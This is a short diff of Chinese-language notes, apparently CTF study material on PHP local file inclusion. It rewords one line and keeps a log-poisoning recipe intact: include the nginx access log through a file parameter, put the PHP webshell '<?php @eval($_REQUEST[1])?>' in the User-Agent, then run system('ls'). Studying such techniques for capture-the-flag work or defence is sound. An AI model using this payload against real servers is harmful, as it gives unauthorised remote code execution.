@@ -57,7 +57,7 @@ payload：
 
 ^
 ## **日志包含**
-考伪协议也可能考日志包含
+考伪协议绕过也可能直接日志包含
 ?file=/var/log/nginx/access.log
 修改UA为：<?php @eval($_REQUEST[1])?>
 1=system("ls");
